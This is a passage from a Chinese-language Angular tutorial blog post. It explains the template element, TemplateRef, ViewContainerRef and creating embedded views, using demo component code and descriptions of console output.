</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><p>以上代码运行后，在浏览器中我们会看到以下内容：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>html Template Element Demo

<span class="token constant">I</span> am span <span class="token keyword">in</span> template
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>而当我们注释掉 tplContainer.appendChild(tplNode) 语句时，刷新浏览器后看到的是：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>html Template Element Demo
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这说明页面中 <code>&lt;template&gt;</code> 模板元素中的内容，如果没有进行处理对用户来说是不可见的。Angular中 <code>&lt;template&gt;</code> 模板元素主要应用在结构指令中。</p> <blockquote><p>TemplateRef</p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span>Component<span class="token punctuation">,</span> TemplateRef<span class="token punctuation">,</span> ViewChild<span class="token punctuation">,</span> AfterViewInit<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h1&gt;Welcome to Angular World&lt;/h1&gt;
    &lt;template #tpl&gt;
      &lt;span&gt;I am span in template&lt;/span&gt;
    &lt;/template&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  name<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token string">'Semlinker'</span><span class="token punctuation">;</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">'tpl'</span><span class="token punctuation">)</span>
  tpl<span class="token operator">:</span> TemplateRef<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">;</span>
  <span class="token function">ngAfterViewInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">dir</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>tpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>上述代码运行后的控制台的输出结果如下：
<img src="/vuebloger/img/post/1329726163-58c62fad5664e_fix732.png" alt="">
从上图中，我们发现 @Component template 中定义的 <code>&lt;template&gt;</code> 模板元素，渲染后被替换成 comment 元素，其内容为 &quot;template bindings={}&quot; 。此外我们通过 @ViewChild 获取的模板元素，是 TemplateRef_ 类的实例，接下来我们来研究一下 TemplateRef_ 类：</p> <ul><li>TemplateRef_</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// @angular/core/src/linker/template_ref.d.ts</span>
<span class="token keyword">export</span> declare <span class="token keyword">class</span> <span class="token class-name">TemplateRef_</span><span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span> <span class="token keyword">extends</span> <span class="token class-name">TemplateRef</span><span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> _parentView<span class="token punctuation">;</span>
    <span class="token keyword">private</span> _nodeIndex<span class="token punctuation">;</span>
    <span class="token keyword">private</span> _nativeElement<span class="token punctuation">;</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span>_parentView<span class="token operator">:</span> AppView<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">,</span> _nodeIndex<span class="token operator">:</span> number<span class="token punctuation">,</span> _nativeElement<span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">createEmbeddedView</span><span class="token punctuation">(</span>context<span class="token operator">:</span> <span class="token constant">C</span><span class="token punctuation">)</span><span class="token operator">:</span> EmbeddedViewRef<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
    elementRef<span class="token operator">:</span> ElementRef<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><ul><li>TemplateRef</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// @angular/core/src/linker/template_ref.d.ts</span>
<span class="token comment">// 用于表示内嵌的template模板，能够用于创建内嵌视图(Embedded Views)</span>
<span class="token keyword">export</span> declare abstract <span class="token keyword">class</span> <span class="token class-name">TemplateRef</span><span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>
    elementRef<span class="token operator">:</span> ElementRef<span class="token punctuation">;</span>
    abstract <span class="token function">createEmbeddedView</span><span class="token punctuation">(</span>context<span class="token operator">:</span> <span class="token constant">C</span><span class="token punctuation">)</span><span class="token operator">:</span> EmbeddedViewRef<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>我们已经知道 <code>&lt;template&gt;</code> 模板元素，渲染后被替换成 comment 元素，那么应该如何显示我们模板中定义的内容呢 ？我们注意到了 TemplateRef 抽象类中定义的 createEmbeddedView
抽象方法，该方法的返回值是 EmbeddedViewRef 对象。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span>Component<span class="token punctuation">,</span> TemplateRef<span class="token punctuation">,</span> ViewChild<span class="token punctuation">,</span> AfterViewInit<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h1&gt;Welcome to Angular World&lt;/h1&gt;
    &lt;template #tpl&gt;
      &lt;span&gt;I am span in template&lt;/span&gt;
    &lt;/template&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  name<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token string">'Semlinker'</span><span class="token punctuation">;</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">'tpl'</span><span class="token punctuation">)</span>
  tpl<span class="token operator">:</span> TemplateRef<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">;</span>
  <span class="token function">ngAfterViewInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> embeddedView <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>tpl<span class="token punctuation">.</span><span class="token function">createEmbeddedView</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">dir</span><span class="token punctuation">(</span>embeddedView<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>上述代码运行后的控制台的输出结果如下：</p> <p><img src="/vuebloger/img/post/86282266-58c62fca17e71_fix732.png" alt=""></p> <p>当调用 createEmbeddedView 方法后返回了 ViewRef_ 视图对象。该视图对象的 rootNodes 属性包含了 <code>&lt;template&gt;</code> 模板中的内容。在上面的例子中，我们知道了 TemplateRef 实例对象中的 elementRef 属性封装了我们的 comment 元素，那么我们可以通过 insertBefore 方法来创建我们模板中定义的内容。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> TemplateRef<span class="token punctuation">,</span> ViewChild<span class="token punctuation">,</span> AfterViewInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h1&gt;Welcome to Angular World&lt;/h1&gt;
    &lt;template #tpl&gt;
      &lt;span&gt;I am span in template {{name}}&lt;/span&gt;
    &lt;/template&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  name<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token string">'Semlinker'</span><span class="token punctuation">;</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">'tpl'</span><span class="token punctuation">)</span>
  tpl<span class="token operator">:</span> TemplateRef<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">;</span>
  <span class="token function">ngAfterViewInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 页面中的&lt;!--template bindings={}--&gt;元素</span>
    <span class="token keyword">let</span> commentElement <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>tpl<span class="token punctuation">.</span>elementRef<span class="token punctuation">.</span>nativeElement<span class="token punctuation">;</span>
    <span class="token comment">// 创建内嵌视图</span>
    <span class="token keyword">let</span> embeddedView <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>tpl<span class="token punctuation">.</span><span class="token function">createEmbeddedView</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 动态添加子节点</span>
    embeddedView<span class="token punctuation">.</span>rootNodes<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">node</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        commentElement<span class="token punctuation">.</span>parentNode
          <span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> commentElement<span class="token punctuation">.</span>nextSibling<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><p>成功运行上面的代码后，在浏览器中我们会看到以下内容：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>Welcome to Angular World

<span class="token constant">I</span> am span <span class="token keyword">in</span> template
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>现在我们来回顾一下，上面的处理步骤：</p> <ul><li>创建内嵌视图(embedded view)</li> <li>遍历内嵌视图中的 rootNodes，动态的插入 node</li></ul> <p>其中TemplateRef用于表示内嵌的template模板元素，通过TemplateRef实例，我们可以方便的创建内嵌视图（Embedded Views），且可以轻松地访问到通过 ElementRef 封装后的 nativeElement。需要注意的是组件视图中的 template 模板元素，经过渲染后会被替换成 comment 元素。其抽象类定义：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>abstract <span class="token keyword">class</span> <span class="token class-name">TemplateRef</span><span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>
  abstract elementRef<span class="token operator">:</span> ElementRef
  abstract <span class="token function">createEmbeddedView</span><span class="token punctuation">(</span>context<span class="token operator">:</span> <span class="token constant">C</span><span class="token punctuation">)</span><span class="token operator">:</span> EmbeddedViewRef<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>Embedded Views可以获取template的内容， templateRef创建Embedded Views视图的方法如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">'tp1'</span><span class="token punctuation">)</span> tp1<span class="token operator">:</span> TemplateRef<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> view <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>tp1<span class="token punctuation">.</span><span class="token function">createEmbeddedView</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>虽然我们已经成功的显示出 template 模板元素中的内容，但发现整个流程还是太复杂了，那有没有简单地方式呢 ？答案是使用 - ViewContainerRef。</p> <blockquote><p>ViewContainerRef</p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> TemplateRef<span class="token punctuation">,</span> ViewChild<span class="token punctuation">,</span> ViewContainerRef<span class="token punctuation">,</span> AfterViewInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h1&gt;Welcome to Angular World&lt;/h1&gt;
    &lt;template #tpl&gt;
      &lt;span&gt;I am span in template&lt;/span&gt;
    &lt;/template&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  name<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token string">'Semlinker'</span><span class="token punctuation">;</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">'tpl'</span><span class="token punctuation">)</span>
  tplRef<span class="token operator">:</span> TemplateRef<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">;</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">'tpl'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> read<span class="token operator">:</span> ViewContainerRef <span class="token punctuation">}</span><span class="token punctuation">)</span>
  tplVcRef<span class="token operator">:</span> ViewContainerRef<span class="token punctuation">;</span>
  <span class="token function">ngAfterViewInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// console.dir(this.tplVcRef); (1)</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>tplVcRef<span class="token punctuation">.</span><span class="token function">createEmbeddedView</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>tplRef<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>移除上面代码中的注释，即可在控制台看到以下的输出信息：
<img src="/vuebloger/img/post/2890676950-58c62ff99992a_fix732.png" alt=""></p> <p>在浏览器中我们会看到以下内容：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>Welcome to Angular World

<span class="token constant">I</span> am span <span class="token keyword">in</span> template
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>接下来我们来看一下 ViewContainerRef_ 类：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// @angular/core/src/linker/view_container_ref.d.ts</span>
<span class="token comment">// 用于表示一个视图容器，可添加一个或多个视图</span>
<span class="token keyword">export</span> declare <span class="token keyword">class</span> <span class="token class-name">ViewContainerRef_</span> <span class="token keyword">implements</span> <span class="token class-name">ViewContainerRef</span> <span class="token punctuation">{</span>
    <span class="token operator">...</span>
    length<span class="token operator">:</span> number<span class="token punctuation">;</span> <span class="token comment">// 返回视图容器中已存在的视图个数</span>
    element<span class="token operator">:</span> ElementRef<span class="token punctuation">;</span>
    injector<span class="token operator">:</span> Injector<span class="token punctuation">;</span>
    parentInjector<span class="token operator">:</span> Injector<span class="token punctuation">;</span>
      <span class="token comment">// 基于TemplateRef创建内嵌视图，并自动添加到视图容器中，可通过index设置</span>
    <span class="token comment">// 视图添加的位置</span>
    createEmbeddedView<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>templateRef<span class="token operator">:</span> TemplateRef<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> context<span class="token operator">?</span><span class="token operator">:</span> <span class="token constant">C</span><span class="token punctuation">,</span> 
      index<span class="token operator">?</span><span class="token operator">:</span> number<span class="token punctuation">)</span><span class="token operator">:</span> EmbeddedViewRef<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
    <span class="token comment">// 基 ComponentFactory创建组件视图</span>
    createComponent<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>componentFactory<span class="token operator">:</span> ComponentFactory<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span><span class="token punctuation">,</span>
      index<span class="token operator">?</span><span class="token operator">:</span> number<span class="token punctuation">,</span> injector<span class="token operator">?</span><span class="token operator">:</span> Injector<span class="token punctuation">,</span> projectableNodes<span class="token operator">?</span><span class="token operator">:</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> ComponentRef<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
    <span class="token function">insert</span><span class="token punctuation">(</span>viewRef<span class="token operator">:</span> ViewRef<span class="token punctuation">,</span> index<span class="token operator">?</span><span class="token operator">:</span> number<span class="token punctuation">)</span><span class="token operator">:</span> ViewRef<span class="token punctuation">;</span>
    <span class="token function">move</span><span class="token punctuation">(</span>viewRef<span class="token operator">:</span> ViewRef<span class="token punctuation">,</span> currentIndex<span class="token operator">:</span> number<span class="token punctuation">)</span><span class="token operator">:</span> ViewRef<span class="token punctuation">;</span>
    <span class="token function">indexOf</span><span class="token punctuation">(</span>viewRef<span class="token operator">:</span> ViewRef<span class="token punctuation">)</span><span class="token operator">:</span> number<span class="token punctuation">;</span>
    <span class="token function">remove</span><span class="token punctuation">(</span>index<span class="token operator">?</span><span class="token operator">:</span> number<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
    <span class="token function">detach</span><span class="token punctuation">(</span>index<span class="token operator">?</span><span class="token operator">:</span> number<span class="token punctuation">)</span><span class="token operator">:</span> ViewRef<span class="token punctuation">;</span>
    <span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>通过源码我们可以知道通过 ViewContainerRef_ 实例，我们可以方便地操作视图，也可以方便地基于 TemplateRef 创建视图。现在我们来总结一下 TemplateRef 与 ViewContainerRef。</p> <p>TemplateRef：用于表示内嵌的 template 模板元素，通过 TemplateRef 实例，我们可以方便创建内嵌视图(Embedded Views)，且可以轻松地访问到通过 ElementRef 封装后的 nativeElement。需要注意的是组件视图中的 template 模板元素，经过渲染后会被替换成 comment 元素。</p> <p>ViewContainerRef：用于表示一个视图容器，可添加一个或多个视图。通过 ViewContainer Ref 实例，我们可以基于 TemplateRef 实例创建内嵌视图，也可以基于组件实例创建host视图 ，并能指定内嵌视图的插入位置，也可以方便对视图容器中已有的视图进行管理。简而言之，ViewContainerRef 的主要作用是创建和管理内嵌视图或组件视图。</p> <ol><li>ViewContainerRef添加内嵌视图（Embedded Views 通过createEmbeddedView实例化嵌入式模板创建）</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'app-demo-test'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;div style=&quot;margin: 30px&quot;&gt;
      &lt;div&gt;
        &lt;button id=&quot;btn&quot; #btn&gt;click&lt;/button&gt;
        &lt;!-- 此处也可以替换为ng-container --&gt;
        &lt;ng-template #container1&gt;&lt;/ng-template&gt;
      &lt;/div&gt;
      &lt;ng-template #tp1&gt;
        &lt;span&gt;
          fasdfasdfasdf
        &lt;/span&gt;
      &lt;/ng-template&gt;
    &lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
  styles<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">DemoTestComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">'tp1'</span><span class="token punctuation">)</span> tp1<span class="token operator">:</span> TemplateRef<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">;</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">'container1'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>read<span class="token operator">:</span> ViewContainerRef<span class="token punctuation">}</span><span class="token punctuation">)</span> container<span class="token operator">:</span> ViewContainerRef<span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>
  <span class="token function">ngAfterViewInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> view <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>tp1<span class="token punctuation">.</span><span class="token function">createEmbeddedView</span><span class="token punctuation">(</span><span class="token string">&quot;123123&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>container<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>view<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><ol start="2"><li>ViewContainerRef创建组件视图（Host Views 通过使用createComponent实例化组件创建 ）</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">'componentContainer'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>read<span class="token operator">:</span> ViewContainerRef<span class="token punctuation">}</span><span class="token punctuation">)</span> container<span class="token operator">:</span> ViewContainerRef<span class="token punctuation">;</span>
<span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> resolver<span class="token operator">:</span> ComponentFactoryResolver</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>
<span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
